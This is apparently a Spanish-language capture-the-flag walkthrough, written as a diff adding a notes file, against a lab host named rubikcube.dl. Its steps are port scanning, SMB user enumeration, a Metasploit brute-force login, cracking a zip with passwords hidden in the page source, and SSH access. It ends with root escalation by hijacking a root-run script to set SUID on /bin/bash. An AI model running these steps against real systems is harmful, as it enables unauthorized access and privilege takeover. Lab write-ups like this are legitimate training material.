@@ -1,0 +1,235 @@
+# Enumeracion de Puertos, Servicios y Versiones
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+
+
+# Fuzzing Web
+
+feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py
+
+──────────────────────────────────────────────────
+404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      100l      350w     3557c http://172.17.0.2/
+200      GET      100l      350w     3557c http://172.17.0.2/index.html
+[####################] - 22s  1245774/1245774 0s      found:2       errors:7536   
+[####################] - 22s  1245774/1245774 57557/s http://172.17.0.2/ 
+
+al chequear el servicio web, no tenia conexion, la url marcaba: rubikcube.dl
+asi que lo agregue al archivo /etc/host y pude ver la web, nada de interes asi
+que revise el codigo fuente pero tampoco consegui nada...
+
+# Servicio SMB
+
+>>>>>		enum4linux -a 172.17.0.2
+
+--------------------------------------------------
+Usuarios del Sistema:
+S-1-22-1-1001 Unix User\memesploit (Local User)
+S-1-22-1-1002 Unix User\memehydra (Local User)
+--------------------------------------------------
+Usuario SMB: 
+user:[memehydra] rid:[0x3e8]
+--------------------------------------------------
+Enumeracion de Recursos compartidos:
+
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+share_memehydra Disk      
+IPC$            IPC       IPC Service (0604dd71c18e server (Samba, Ubuntu))
+--------------------------------------------------
+
+hemos podido extraer usuarios del sistema y smb, ademas podemos ver que tambien
+existen recursos compartidos
+
+>>>>>		smbmap 
+
+intente enumerar recursos compartidos con smbmap pero solicitaba passwd.
+hice un ataque de diccionario a smb pero no obtuve resultados con los 
+diccionarios usados, asi que cree una wordlist con las palabras del servicio web
+para despues volver aplicar un ataque de diccionario
+
+wecl http://rubikcube.dl/ -w wordlist
+msfconsole -q
+use auxiliary/scanner/smb/smb_login
+show options
+set PASS_FILE wordlist
+set RHOSTS 172.17.0.2
+set SMBUser memehydra
+run
+
+[+] 172.17.0.2:445        - 172.17.0.2:445 - Success: '.\memehydra:fuerzabrutasiempre'
+
+hemos conseguido la password: fuerzabrutasiempre. Volvemos a enumerar recursos compartidos
+
+=============================================================================
+smbmap -u 'memehydra' -p 'fuerzabrutasiempre' -H 172.17.0.2
+
+[+] IP: 172.17.0.2:445	Name: rubikcube.dl		Status: Authenticated
+Disk							Permissions	Comment
+----							-----------	-------
+print$							READ ONLY	Printer Drivers
+share_memehydra						READ ONLY	
+IPC$							NO ACCESS	IPC Service (0604dd71c18e server (Samba, Ubuntu))
+[*] Closed 1 connections
+==============================================================================
+
+smbmap -u 'memehydra' -p 'fuerzabrutasiempre' -H 172.17.0.2 -r share_memehydra
+
+[+] IP: 172.17.0.2:445	Name: rubikcube.dl		Status: Authenticated
+Disk							Permissions	Comment
+----							-----------	-------
+print$							READ ONLY	Printer Drivers
+share_memehydra						READ ONLY	
+./share_memehydra
+dr--r--r--                0 Sat Aug 31 11:15:12 2024	.
+dr--r--r--                0 Sat Aug 31 11:15:12 2024	..
+fr--r--r--              224 Sat Aug 31 11:15:05 2024	secret.zip
+IPC$							NO ACCESS	IPC Service (0604dd71c18e server (Samba, Ubuntu))
+[*] Closed 1 connections
+===============================================================================
+
+aqui observamos un archivo: secret.zip, el cual procedemos a descargarnos
+
+smbclient //172.17.0.2/share_memehydra -U memehydra%fuerzabrutasiempre -c 'get secret.zip'
+getting file \secret.zip of size 224 as secret.zip (2240000.0 KiloBytes/sec) (average inf KiloBytes/sec)
+
+procedemos a descomprimirlo
+
+7z x secret.zip					| solicita password
+
+intente crackear el hash del .zip pero sin resultados, hice la prueba con varias wordlist y nada,
+asi que me fui de nuevo a la web a inspeccionar cuidadosamente el codigo fuente y encontre en diferentes
+partes del codigo:
+
+<span style="color: transparent;">memehydra</span>
+<span style="color: transparent;">fuerzabrutasiempre</span>
+<span style="color: transparent;">memesploit_ctf</span>
+
+esto lo que hace es ocultar las palabras: memehydra, fuerzabrutasiempre y memesploit_ctf
+asi que probe cada palabra para descomprimir el .zip
+
+7z x secret.zip
+pass: memesploit_ctf				| funciono! esta era la clave y procedo a leer el .txt
+
+============================
+memesploit:metasploitelmejor
+============================
+
+parecen ser las credenciales por ssh asi que procedemos a probarlo
+
+ssh memesploit@172.17.0.2
+pass: metasploitelmejor				| Accedimos al sistema
+
+
+# Escalada
+
+sudo -l
+
+(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
+
+buscaremos login_monitor a ver si tenemos permisos de escritura
+
+find / -name loging_monitor 2>/dev/null
+/etc/init.d/login_monitor
+/etc/login_monitor
+ls -la /etc/init.d/login_monitor
+-rwxr-xr-x 1 root root 1437 Aug 31 17:08 /etc/init.d/login_monitor
+
+por lo visto no tenemos permisos, asi que no podremos hacer nada por aqui
+pero tenemos tambien /etc/login_monitor
+
+ls -la /etc/login_monitor
+
+total 44
+drwxrwx--- 1 root security 4096 Sep  4 08:46 .
+drwxr-xr-x 1 root root     4096 Sep  4 08:22 ..
+-rwxr-xr-x 1 root root      620 Aug 31 17:50 actionban.sh
+-rwxr-xr-x 1 root root      472 Aug 31 17:31 activity.sh
+-rw-r--r-- 1 root root      200 Aug 31 17:30 loggin.conf
+-rw-r--r-- 1 root root      224 Aug 31 17:29 network.conf
+-rwxr-xr-x 1 root root      501 Aug 31 17:30 network.sh
+-rw-r--r-- 1 root root      209 Aug 31 17:29 security.conf
+-rwxr-xr-x 1 root root      488 Aug 31 17:30 security.sh
+
+aqui tampoco tenemos permisos de escritura sobre ningun archivo, pero tambien podemos
+observar que el grupo security cuenta con permisos sobre el directorio login_monitor
+asi que verificamos a cuales grupos pertenecemos a ver si somos parte del grupo security
+
+id
+uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
+
+pertenecemos al grupo security asi que contamos con permisos sobre el directorio, por lo que
+primero veremos como funcionan los script y asi saber como desencadenarlos..
+
+cd /etc/login_monitor
+nano actionban.sh
+==============================================================================================================
+#!/bin/bash
+
+# Ruta del archivo que simula el registro de bloqueos
+BLOCK_LOG="/tmp/block_log.txt"
+
+# Función para generar una IP aleatoria
+generate_random_ip() {
+    echo "$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))"
+}
+
+# Generar una IP aleatoria
+IP_TO_BLOCK=$(generate_random_ip)
+
+# Mensaje de simulación
+MESSAGE="Simulación de bloqueo de IP: $IP_TO_BLOCK"
+
+# Mostrar el mensaje en la terminal
+echo "$MESSAGE"
+
+# Registrar el intento de bloqueo en el archivo
+echo "$(date): $MESSAGE" >> "$BLOCK_LOG"
+
+echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"
+================================================================================================================
+
+este script simula el bloqueo de una ip aleatoria y lleva el registro en el directorio /tmp
+revisamos el directorio /tmp y en efecto se encuentra el archivo de registros "/tmp/block_log.txt"
+eso indica que el script esta funcionando.
+
+No me queda claro que desencadena la ejecucion de este script, se me ocurrio que podria ser desencadenado
+al ejecutar >>> sudo /usr/sbin/service login_monitor restart <<<< pero despues de hacer pruebas, queda claro
+que no se ejecuta, asi que revisando el archivo de contiguracion network.conf y el script network.sh me 
+consigo que estan seteando el puerto 22 (SSH), asi que realizo pruebas con ese puerto
+y me doy cuenta que despues de una conexion exitosa o fallida por SSH provoca la ejecucion del script.
+
+asi que ahora que sabemos que lo ejecuta, vamos hacer la escalada a root:
+
+
+mv actionban.sh actionban.sp			
+cp actionban.sp actionban.sh			
+nano actionban.sh
+
+========================================================
+vamos solo agregar una linea mas de codigo al script:
+
+chmod u+s /bin/bash
+
+guardamos los cambios y salimos
+========================================================
+
+le cambiamos el nombre al script actionban.sh para luego crear una copia pero con el nombre original, con esto conseguimos 
+poder modificar el script y que suplante al original.
+
+como ya sabemos que desencadena la ejecucion del script, nos abrimos otra terminal y nos conectamos de nuevo via ssh
+
+ssh memesploit@172.17.0.2
+pass:metasploitelmejor
+
+bash-5.2$ whoami
+memesploit
+bash-5.2$ /bin/bash -p
+bash-5.2# whoami
+#root
